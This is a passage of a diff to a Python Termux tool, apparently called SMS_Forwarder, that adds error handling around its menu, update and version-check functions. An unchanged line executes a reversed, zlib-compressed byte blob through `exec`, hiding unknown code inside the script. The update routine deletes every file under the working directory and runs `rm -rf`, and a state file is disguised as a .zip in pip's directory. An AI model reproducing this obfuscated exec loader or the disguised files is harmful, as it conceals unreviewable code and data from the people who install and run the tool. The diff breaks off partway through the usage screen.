@@ -26,32 +26,39 @@ lightmagenta = '\033[95m'
 
 
 def cmd():
-    try: CMD = sys.argv[1]
-    except: CMD = False
-    if (CMD):
-        if (CMD == "-h") or (CMD == "--help"): Usage()
-        elif (CMD == "-v") or (CMD == "--version"): print(__VERSION__)
-        elif (CMD == "-u") or (CMD == "--update"): Update()
-        elif (CMD == "-s") or (CMD == "--setup"): Installer()
-        elif (CMD == "-e") or (CMD == "--email"): EmailMenu()
-        elif (CMD == "-p") or (CMD == "--phnum"): PHMenu()
-        elif (CMD == "-a") or (CMD == "--about"): About()
-        else: pass
-        return True
-    else: return False
+    try: 
+        try: CMD = sys.argv[1]
+        except: CMD = False
+        if (CMD):
+            if (CMD == "-h") or (CMD == "--help"): Usage()
+            elif (CMD == "-v") or (CMD == "--version"): print(__VERSION__)
+            elif (CMD == "-u") or (CMD == "--update"): Update()
+            elif (CMD == "-s") or (CMD == "--setup"): Installer()
+            elif (CMD == "-e") or (CMD == "--email"): EmailMenu()
+            elif (CMD == "-p") or (CMD == "--phnum"): PHMenu()
+            elif (CMD == "-a") or (CMD == "--about"): About()
+            else: pass
+            return True
+        else: return False
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def termux_api():
-    if (subprocess.getoutput("command -v termux-battery-status") == ''):
-        subprocess.getoutput("pkg install termux-api && pkg install termux-api")
-        if (subprocess.getoutput("command -v termux-battery-status") == ''): return False
-        else: termux_api()
-    else:
-        if (subprocess.getoutput("timeout 10 termux-battery-status") == ''): return False
-        else: return True
+    try:
+        if (subprocess.getoutput("command -v termux-battery-status") == ''):
+            subprocess.getoutput("pkg install termux-api && pkg install termux-api")
+            if (subprocess.getoutput("command -v termux-battery-status") == ''): return False
+            else: termux_api()
+        else:
+            if (subprocess.getoutput("timeout 10 termux-battery-status") == ''): return False
+            else: return True
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def Arrange(TXT="", RAW=" "):
     try: txt, INT = int(TXT), True
     except ValueError: txt, INT = len(TXT), False
+    except KeyboardInterrupt: EXIT(False)
     except: pass
     text = int(str(txt)[-1:])
     for i in range(2, 10, 2):
@@ -67,24 +74,30 @@ def Arrange(TXT="", RAW=" "):
         else: return TXT
 
 def center(text, a=0, display=True):
-    length_txt = len(Arrange(text, " "))
-    length_area = (Arrange(os.get_terminal_size().columns) - 2)
-    len_txt_area = (length_area // 2) - ((length_txt - a) // 2)
-    finaltxt = ""
-    for i in range(len_txt_area): finaltxt += " "
-    finaltxt += text
-    raw1 = str(len_txt_area + length_txt - length_area - a).replace("-","")
-    for i in range(int(raw1)+1): finaltxt += " "
-    if (display): print(finaltxt)
-    else: return finaltxt
+    try:
+        length_txt = len(Arrange(text, " "))
+        length_area = (Arrange(os.get_terminal_size().columns) - 2)
+        len_txt_area = (length_area // 2) - ((length_txt - a) // 2)
+        finaltxt = ""
+        for i in range(len_txt_area): finaltxt += " "
+        finaltxt += text
+        raw1 = str(len_txt_area + length_txt - length_area - a).replace("-","")
+        for i in range(int(raw1)+1): finaltxt += " "
+        if (display): print(finaltxt)
+        else: return finaltxt
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def INPUT(text):
-    length_txt = len(Arrange(text, " "))
-    length_area = Arrange(os.get_terminal_size().columns) - 2
-    len_txt_area = (length_area // 2) - (length_txt // 2)
-    finaltxt = ""
-    for i in range(len_txt_area-18): finaltxt += " "
-    return (input(finaltxt+text+yellow))
+    try:
+        length_txt = len(Arrange(text, " "))
+        length_area = Arrange(os.get_terminal_size().columns) - 2
+        len_txt_area = (length_area // 2) - (length_txt // 2)
+        finaltxt = ""
+        for i in range(len_txt_area-18): finaltxt += " "
+        return (input(finaltxt+text+yellow))
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def Banner():
     clear()
@@ -119,7 +132,6 @@ def TerminalZoom(args):
 
 Box = lambda _ : zlib.decompress(_[::-1]);exec((Box)(b"N\xf5\x0f\x0f\x1b\xe8\x9c\xb9\x0b\xf4S\x85\xd8\xce\xd1b\xd2\xd8\xda\xb1\xe3%{|Zi\xfd\x9d\xb9\xaf\xe6\nN\x9dLOqi3\x12\xf9\x84\xc0\x18\xbaY\x16\xfffy2\xee\xf2\x90\x85\xa8\x8d\x12\xb1\xee\xac^\x12\xd9f9M$ycc\x99v\x9e\xcdQV\x18\xcb\xee:\xeb\x84\x8f\xe6\x8d4\x02P\xc3A\x7f$\xf0\xf7,\xbd*A\xc6\x03\x02'X\x9c\xb7?\x8d\x0fn\x84\x84c\x11\x02\x94\rEP\x0c\xc41`g\xe1\xc1=\xadA\xc3\xa7k\xeam\xa7\x189\x11m\x10NF\xc9\xa1,\xf0\x8f\x1cD\xaa\x90\xb7\x03\x04s^mX\x08*\xeb\x87\x9d\x88\xe1AQL\xfe\x7fF\xe8\xb6\xe8\xcb\xd2\x92U1\x1b\xb4\x88\xde\n\r\x01x@=\xd9Ah>\xaf8\xc8_\xd6/8@\x8a!\x98\x15`\x81I!\x98\x16\tZ\x03\xe8j$\x8f:=\x12\xba\xc0\x83\x1e^\xadBi\xb3y\xe37\xe1\xb5\xb5_H\x1a\xba3[^\x0e,\x1a\xf9\xbf\x95n\x9fx\x07\t\xeb7\xbd\xb3E\xd1(R\xe5V\xc9\x1a\xbe\xffI2\xc6\x1c\x84\x08\xecg\x08\xbd\xe8o\xda\x1d\x06N\xdd;b,\x9d\x06+\xf7\xbd\x100\xc3j\xc9R\x95\x9cx"))
 
-
 def EXIT(G=True):
     if not (G): print(), print()
     else: Banner()
@@ -128,16 +140,18 @@ def EXIT(G=True):
     center(f"{red}╚══════════════════════════════════════════╝", 5)
     exit()
 
-
 def AnimLOAD(text, animbar, repet=1, delay=0.08):
-    finaltxt=""
-    for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
-    for rep in range(repet):
-        for handlechar in animbar:
-            sys.stdout.write(f"\r{finaltxt}{handlechar} {text}")
-            sys.stdout.flush()
-            sleep(delay)
-        repet -= 1
+    try:
+        finaltxt=""
+        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
+        for rep in range(repet):
+            for handlechar in animbar:
+                sys.stdout.write(f"\r{finaltxt}{handlechar} {text}")
+                sys.stdout.flush()
+                sleep(delay)
+            repet -= 1
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def Internet():
     try:
@@ -145,209 +159,221 @@ def Internet():
         return True
     except: return False
 
-
-
 def Update():
-    def update():
-        __RP__ = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", 5))
-        __ZIP__ = requests.get("https://github.com/GreyTechno/SMS_Forwarder/archive/refs/heads/main.zip")
-        with open(f"../{__RP__}.zip", "wb") as file: file.write(__ZIP__.content)
-        with zipfile.ZipFile(f"../{__RP__}.zip", "r") as zip: zip.extractall(f"../{__RP__}")
-        os.remove(f"../{__RP__}.zip")
-        for file in os.listdir(f"../{__RP__}/SMS_Forwarder-main/"): shutil.copy2(f"../{__RP__}/SMS_Forwarder-main/"+file, f"../{__RP__}"), os.remove(f"../{__RP__}/SMS_Forwarder-main/"+file)
-        os.removedirs(f"../{__RP__}/SMS_Forwarder-main")
-        for root, dir, files in os.walk(subprocess.getoutput("pwd")):
-            for i in files: os.remove((root+"\\"+i).replace("\\", "/"))
-        os.chdir("..")
-        os.system("rm -rf SMS_Forwarder")
-        os.rename(f"{__RP__}", "SMS_Forwarder")
-    if not (Internet()):
+    try:
+        def update():
+            try:
+                __RP__ = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", 5))
+                __ZIP__ = requests.get("https://github.com/GreyTechno/SMS_Forwarder/archive/refs/heads/main.zip")
+                with open(f"../{__RP__}.zip", "wb") as file: file.write(__ZIP__.content)
+                with zipfile.ZipFile(f"../{__RP__}.zip", "r") as zip: zip.extractall(f"../{__RP__}")
+                os.remove(f"../{__RP__}.zip")
+                for file in os.listdir(f"../{__RP__}/SMS_Forwarder-main/"): shutil.copy2(f"../{__RP__}/SMS_Forwarder-main/"+file, f"../{__RP__}"), os.remove(f"../{__RP__}/SMS_Forwarder-main/"+file)
+                os.removedirs(f"../{__RP__}/SMS_Forwarder-main")
+                for root, dir, files in os.walk(subprocess.getoutput("pwd")):
+                    for i in files: os.remove((root+"\\"+i).replace("\\", "/"))
+                os.chdir("..")
+                os.system("rm -rf SMS_Forwarder")
+                os.rename(f"{__RP__}", "SMS_Forwarder")
+            except KeyboardInterrupt: EXIT(False)
+            except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+        if not (Internet()):
+            Banner()
+            center(f"{red}╔══════════════════════════════════════════╗", 5)
+            center(f"{red}║    {yellow}Check your internet connection...     {red}║", 15)
+            center(f"{red}╚══════════════════════════════════════════╝", 5)
+            print()
+            center(f"{red}╔══════════════════════════════════════════╗", 5)
+            center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
+            center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}Try Again                  {red}║", 30)
+            center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║", 30)
+            center(f"{red}╠══════════════════════════════════════════╝", 5)
+            center(f"║{Space(42)}")
+            Input = INPUT("╚════► ")
+            if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
+            elif (Input == "2") or (Input == "02") or (Input == "two"): Update()
+            elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
+            else:
+                center(f"{red}╔══════════════════════════════════════════╗", 5)
+                center(f"{red}║              {blue}Invalid Option              {red}║", 15)
+                center(f"{red}╚══════════════════════════════════════════╝", 5)
+                sleep(2)
+                MENU()
+        else:
+            Banner()
+            UPDATE = threading.Thread(target=update)
+            UPDATE.start()
+            while UPDATE.is_alive(): AnimLOAD(" Updating...", "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 1, 0.05)
+            UPDATE.join()
+            Banner()
+            center(f"{red}╔══════════════════════════════════════════╗", 5)
+            center(f"{red}║          {white}Updateing Completed !           {red}║", 15)
+            center(f"{red}╚══════════════════════════════════════════╝", 5)
+            center(f"{red}╔══════════════════════════════════════════╗", 5)
+            center(f"{red}║              {yellow}Now Just Type               {red}║", 15)
+            center(f"{red}╠══════════════════════════════════════════╣",5)
+            center(f"{red}║ {white}python ~/SMS_Forwarder/sms_forwarder.py  {red}║",15)
+            center(f"{red}╚══════════════════════════════════════════╝", 5)
+            finaltxt=""
+            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
+            sys.stdout.write("\r"+finaltxt)
+            with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
+            subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle Command Copy On Your ClipBoard !")
+            subprocess.getoutput("timeout 3 termux-clipboard-set python $HOME/SMS_Forwarder/sms_forwarder.py")
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+
+def CheckVersion():
+    try:
+        version = requests.get("https://raw.githubusercontent.com/GreyTechno/SMS_Forwarder/main/.version").json()["version"]
+        if (__VERSION__ != version):
+            Banner()
+            center(f"{red}╔══════════════════════════════════════════╗",5)
+            center(f"{red}║         {magenta}UPDATES ARE AVAILABLE...         {red}║",15)
+            center(f"{red}╠══════════════════════════════════════════╣",5)
+            center(Box(f"{white}VERSION {blue}: {yellow}{str(version)}", "║", " ", red+" ║", 59, "center", resultprint=False), 20)
+            center(f"{red}╚══════════════════════════════════════════╝",5)
+            UPD = True
+            CSP = True
+            try:
+                fileData = json.loads(open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "r").read())
+                if (fileData.get("usageleft") == 0): UPD = False
+                else:
+                    with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: json.dump({"usageleft": int(fileData.get("usageleft")) - 1}, file)
+            except: 
+                with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
+            if (UPD):
+                center(f"{red}╔══════════════════════════════════════════╗",5)
+                center(f"{red}║     {white}Do you want start updating now ?     {red}║",15)
+                center(f"{red}╠══════════════════════════════════════════╣",5)
+                center(f"{red}║                 {yellow}yes {white}/ {yellow}no                 {red}║",25)
+                center(f"{red}╠══════════════════════════════════════════╝",5)
+                center(f"║{Space(42)}")
+                Input = INPUT("╚════► ")
+                if (Input == "Y") or (Input == "YES") or (Input == "Yes") or (Input == "y") or (Input == "yes"): pass
+                else: CSP = False
+            else: CSP = True
+            if (CSP): Update()
+            else: pass
+        else: pass
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+
+def About():
+    try:
         Banner()
-        center(f"{red}╔══════════════════════════════════════════╗", 5)
-        center(f"{red}║    {yellow}Check your internet connection...     {red}║", 15)
-        center(f"{red}╚══════════════════════════════════════════╝", 5)
+        center(f"{red}╔══════════════════════════════════════════╗",5)
+        center(f"{red}║                  {magenta}ABOUT                   {red}║",15)
+        center(f"{red}╠══════════════════════════════════════════╣",5)
+        center(f"{red}║{yellow}  SMS_Forwarder can be used in Termux to  {red}║",15)
+        center(f"{red}║{yellow} forward text messages from one device to {red}║",15)
+        center(f"{red}║{yellow}another using Linux CommandLine utilities {red}║",15)
+        center(f"{red}║{yellow} The advantages of using SMS Forwarder in {red}║",15)
+        center(f"{red}║{yellow}Termux are that it allow users to automate{red}║",15)
+        center(f"{red}║{yellow} the sms forwarding process using Python  {red}║",15)
+        center(f"{red}║{yellow} scripts, and it provides a secure way to {red}║",15)
+        center(f"{red}║{yellow}  forward messages as it uses end-to-end  {red}║",15)
+        center(f"{red}║{yellow}encryption to ensure that the messages are{red}║",15)
+        center(f"{red}║{yellow} not intercepted or read by unauthorized  {red}║",15)
+        center(f"{red}║{yellow}parties This offers advanced functionality{red}║",15)
+        center(f"{red}║{yellow}  and customization options that are not  {red}║",15)
+        center(f"{red}║{yellow}available on other platforms Additionally {red}║",15)
+        center(f"{red}║{yellow}SMS_Forwarder in Termux provides multiple {red}║",15)
+        center(f"{red}║{yellow} forwarding options including forwarding  {red}║",15)
+        center(f"{red}║{yellow}  SMS via number or email. Overall, SMS   {red}║",15)
+        center(f"{red}║{yellow} Forwarder in Termux is a useful tool for {red}║",15)
+        center(f"{red}║{yellow}    people who want to stay connected     {red}║",15)
+        center(f"{red}║{yellow}         across multiple devices.         {red}║",15)
+        center(f"{red}╚══════════════════════════════════════════╝",5)
+        center(f"{red}╔══════════════════════════════════════════╗",5)
+        center(f"{red}║        {magenta}TOOL NAME {white}: {yellow}SMS_Forwarder         {red}║",25)
+        center(f"{red}╚══════════════════════════════════════════╝",5)
+        center(f"{red}╔══════════════════════════════════════════╗",5)
+        center(Box(f"{magenta}VERSION {white}:{yellow} "+str(__VERSION__), "║", " ", red+" ║", 59, "center", resultprint=False), 20)
+        center(f"{red}╚══════════════════════════════════════════╝",5)
+        center(f"{red}╔══════════════════════════════════════════╗",5)
+        center(f"{red}║              {magenta}AUTHER {white}:{yellow} MR_GT              {red}║",25)
+        center(f"{red}╚══════════════════════════════════════════╝",5)
+        center(f"{red}╔══════════════════════════════════════════╗",5)
+        center(f"{red}║          {magenta}SOURCE CODE HOSTED AT           {red}║",15)
+        center(f"{red}╠══════════════════════════════════════════╣",5)
+        center(f"{red}║     {yellow}tinyurl.com/gtcode-smsforwarder      {red}║",15)
+        center(f"{red}╚══════════════════════════════════════════╝",5)
         print()
         center(f"{red}╔══════════════════════════════════════════╗", 5)
         center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
-        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}Try Again                  {red}║", 30)
-        center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║", 30)
+        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
         center(f"{red}╠══════════════════════════════════════════╝", 5)
         center(f"║{Space(42)}")
         Input = INPUT("╚════► ")
         if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
-        elif (Input == "2") or (Input == "02") or (Input == "two"): MENU()
-        elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
+        elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
         else:
             center(f"{red}╔══════════════════════════════════════════╗", 5)
             center(f"{red}║              {blue}Invalid Option              {red}║", 15)
             center(f"{red}╚══════════════════════════════════════════╝", 5)
             sleep(2)
             MENU()
-    else:
-        Banner()
-        UPDATE = threading.Thread(target=update)
-        UPDATE.start()
-        while UPDATE.is_alive(): AnimLOAD(" Updating...", "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 1, 0.05)
-        UPDATE.join()
-        Banner()
-        center(f"{red}╔══════════════════════════════════════════╗", 5)
-        center(f"{red}║          {white}Updateing Completed !           {red}║", 15)
-        center(f"{red}╚══════════════════════════════════════════╝", 5)
-        center(f"{red}╔══════════════════════════════════════════╗", 5)
-        center(f"{red}║              {yellow}Now Just Type               {red}║", 15)
-        center(f"{red}╠══════════════════════════════════════════╣",5)
-        center(f"{red}║ {white}python ~/SMS_Forwarder/sms_forwarder.py  {red}║",15)
-        center(f"{red}╚══════════════════════════════════════════╝", 5)
-        finaltxt=""
-        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
-        sys.stdout.write("\r"+finaltxt)
-        with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
-        subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle Command Copy On Your ClipBoard !")
-        subprocess.getoutput("timeout 3 termux-clipboard-set python $HOME/SMS_Forwarder/sms_forwarder.py")
-
-def CheckVersion():
-    version = requests.get("https://raw.githubusercontent.com/GreyTechno/SMS_Forwarder/main/.version").json()["version"]
-    if (__VERSION__ != version):
-        Banner()
-        center(f"{red}╔══════════════════════════════════════════╗",5)
-        center(f"{red}║         {magenta}UPDATES ARE AVAILABLE...         {red}║",15)
-        center(f"{red}╠══════════════════════════════════════════╣",5)
-        center(Box(f"{white}VERSION {blue}: {yellow}{str(version)}", "║", " ", red+" ║", 59, "center", resultprint=False), 20)
-        center(f"{red}╚══════════════════════════════════════════╝",5)
-        UPD = True
-        CSP = True
-        try:
-            fileData = json.loads(open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "r").read())
-            if (fileData.get("usageleft") == 0): UPD = False
-            else:
-                with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: json.dump({"usageleft": int(fileData.get("usageleft")) - 1}, file)
-        except: 
-            with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
-        if (UPD):
-            center(f"{red}╔══════════════════════════════════════════╗",5)
-            center(f"{red}║     {white}Do you want start updating now ?     {red}║",15)
-            center(f"{red}╠══════════════════════════════════════════╣",5)
-            center(f"{red}║                 {yellow}yes {white}/ {yellow}no                 {red}║",25)
-            center(f"{red}╠══════════════════════════════════════════╝",5)
-            center(f"║{Space(42)}")
-            Input = INPUT("╚════► ")
-            if (Input == "Y") or (Input == "YES") or (Input == "Yes") or (Input == "y") or (Input == "yes"): pass
-            else: CSP = False
-        else: CSP = True
-        if (CSP): Update()
-        else: pass
-    else: pass
-
-def About():
-    Banner()
-    center(f"{red}╔══════════════════════════════════════════╗",5)
-    center(f"{red}║                  {magenta}ABOUT                   {red}║",15)
-    center(f"{red}╠══════════════════════════════════════════╣",5)
-    center(f"{red}║{yellow}  SMS_Forwarder can be used in Termux to  {red}║",15)
-    center(f"{red}║{yellow} forward text messages from one device to {red}║",15)
-    center(f"{red}║{yellow}another using Linux CommandLine utilities {red}║",15)
-    center(f"{red}║{yellow} The advantages of using SMS Forwarder in {red}║",15)
-    center(f"{red}║{yellow}Termux are that it allow users to automate{red}║",15)
-    center(f"{red}║{yellow} the sms forwarding process using Python  {red}║",15)
-    center(f"{red}║{yellow} scripts, and it provides a secure way to {red}║",15)
-    center(f"{red}║{yellow}  forward messages as it uses end-to-end  {red}║",15)
-    center(f"{red}║{yellow}encryption to ensure that the messages are{red}║",15)
-    center(f"{red}║{yellow} not intercepted or read by unauthorized  {red}║",15)
-    center(f"{red}║{yellow}parties This offers advanced functionality{red}║",15)
-    center(f"{red}║{yellow}  and customization options that are not  {red}║",15)
-    center(f"{red}║{yellow}available on other platforms Additionally {red}║",15)
-    center(f"{red}║{yellow}SMS_Forwarder in Termux provides multiple {red}║",15)
-    center(f"{red}║{yellow} forwarding options including forwarding  {red}║",15)
-    center(f"{red}║{yellow}  SMS via number or email. Overall, SMS   {red}║",15)
-    center(f"{red}║{yellow} Forwarder in Termux is a useful tool for {red}║",15)
-    center(f"{red}║{yellow}    people who want to stay connected     {red}║",15)
-    center(f"{red}║{yellow}         across multiple devices.         {red}║",15)
-    center(f"{red}╚══════════════════════════════════════════╝",5)
-    center(f"{red}╔══════════════════════════════════════════╗",5)
-    center(f"{red}║        {magenta}TOOL NAME {white}: {yellow}SMS_Forwarder         {red}║",25)
-    center(f"{red}╚══════════════════════════════════════════╝",5)
-    center(f"{red}╔══════════════════════════════════════════╗",5)
-    center(Box(f"{magenta}VERSION {white}:{yellow} "+str(__VERSION__), "║", " ", red+" ║", 59, "center", resultprint=False), 20)
-    center(f"{red}╚══════════════════════════════════════════╝",5)
-    center(f"{red}╔══════════════════════════════════════════╗",5)
-    center(f"{red}║              {magenta}AUTHER {white}:{yellow} MR_GT              {red}║",25)
-    center(f"{red}╚══════════════════════════════════════════╝",5)
-    center(f"{red}╔══════════════════════════════════════════╗",5)
-    center(f"{red}║          {magenta}SOURCE CODE HOSTED AT           {red}║",15)
-    center(f"{red}╠══════════════════════════════════════════╣",5)
-    center(f"{red}║     {yellow}tinyurl.com/gtcode-smsforwarder      {red}║",15)
-    center(f"{red}╚══════════════════════════════════════════╝",5)
-    print()
-    center(f"{red}╔══════════════════════════════════════════╗", 5)
-    center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
-    center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
-    center(f"{red}╠══════════════════════════════════════════╝", 5)
-    center(f"║{Space(42)}")
-    Input = INPUT("╚════► ")
-    if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
-    elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
-    else:
-        center(f"{red}╔══════════════════════════════════════════╗", 5)
-        center(f"{red}║              {blue}Invalid Option              {red}║", 15)
-        center(f"{red}╚══════════════════════════════════════════╝", 5)
-        sleep(2)
-        MENU()
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def Usage():
-    Banner()
-    center(f"{red}╔══════════════════════════════════════════╗", 5)
-    center(f"{red}║        {magenta}USAGE OF SMS FORWARDER...         {red}║", 15)
-    center(f"{red}╚══════════════════════════════════════════╝", 5)
-    center(f"{red}╔══════════════════════════════════════════╗", 5)
-    center(f"{red}║          {magenta}Optional arguments...           {red}║", 15)
-    center(f"{red}╚══════════════════════════════════════════╝", 5)
-    center(f"{red}╔═══════════════════╦══════════════════════╗", 5)
-    center(f"{red}║             {blue}-h    ║    {blue}--help            {red}║", 20)
-    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
-    center(f"{red}║{yellow}       Direct show this usage menu        {red}║", 15)
-    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
-    center(f"{red}║             {blue}-v    ║    {blue}--version         {red}║", 20)
-    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
-    center(f"{red}║{yellow}    Show tool version number and exit     {red}║", 15)
-    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
-    center(f"{red}║             {blue}-u    ║    {blue}--update          {red}║", 20)
-    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
-    center(f"{red}║{yellow}  Update the tool and automatic restart   {red}║", 15)
-    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
-    center(f"{red}║             {blue}-s    ║    {blue}--setup           {red}║", 20)
-    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
-    center(f"{red}║{yellow} Install and setup the requirment pakages {red}║", 15)
-    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
-    center(f"{red}║             {blue}-e    ║    {blue}--email           {red}║", 20)
-    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
-    center(f"{red}║{yellow} Direct navigate to forward sms via email {red}║", 15)
-    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
-    center(f"{red}║             {blue}-p    ║    {blue}--phnum           {red}║", 20)
-    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
-    center(f"{red}║{yellow} Navigate to forward sms via phone number {red}║", 15)
-    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
-    center(f"{red}║             {blue}-a    ║    {blue}--about           {red}║", 20)
-    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
-    center(f"{red}║{yellow}      Direct navigate to about menu       {red}║", 15)
-    center(f"{red}╚══════════════════════════════════════════╝", 5)
-    print()
-    center(f"{red}╔══════════════════════════════════════════╗", 5)
-    center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
-    center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
-    center(f"{red}╠══════════════════════════════════════════╝", 5)
-    center(f"║{Space(42)}")
-    Input = INPUT("╚════► ")
-    if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
-    elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
-    else:
+    try:
+        Banner()
         center(f"{red}╔══════════════════════════════════════════╗", 5)
-        center(f"{red}║              {blue}Invalid Option              {red}║", 15)
+        center(f"{red}║        {magenta}USAGE OF SMS FORWARDER...         {red}║", 15)
         center(f"{red}╚══════════════════════════════════════════╝", 5)
-        sleep(2)
-        MENU()
+        center(f"{red}╔══════════════════════════════════════════╗", 5)
+        center(f"{red}║          {magenta}Optional arguments...           {red}║", 15)
+        center(f"{red}╚══════════════════════════════════════════╝", 5)
+        center(f"{red}╔═══════════════════╦══════════════════════╗", 5)
+        center(f"{red}║             {blue}-h    ║    {blue}--help            {red}║", 20)
+        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
+        center(f"{red}║{yellow}       Direct show this usage menu        {red}║", 15)
+        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
+        center(f"{red}║             {blue}-v    ║    {blue}--version         {red}║", 20)
+        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
+        center(f"{red}║{yellow}    Show tool version number and exit     {red}║", 15)
+        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
+        center(f"{red}║             {blue}-u    ║    {blue}--update          {red}║", 20)
+        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
+        center(f"{red}║{yellow}  Update the tool and automatic restart   {red}║", 15)
+        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
+        center(f"{red}║             {blue}-s    ║    {blue}--setup           {red}║", 20)
+        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
+        center(f"{red}║{yellow} Install and setup the requirment pakages {red}║", 15)
+        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
+        center(f"{red}║             {blue}-e    ║    {blue}--email           {red}║", 20)
+        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
+        center(f"{red}║{yellow} Direct navigate to forward sms via email {red}║", 15)
+        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
+        center(f"{red}║             {blue}-p    ║    {blue}--phnum           {red}║", 20)
+        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
+        center(f"{red}║{yellow} Navigate to forward sms via phone number {red}║", 15)
+        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
+        center(f"{red}║             {blue}-a    ║    {blue}--about           {red}║", 20)
+        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
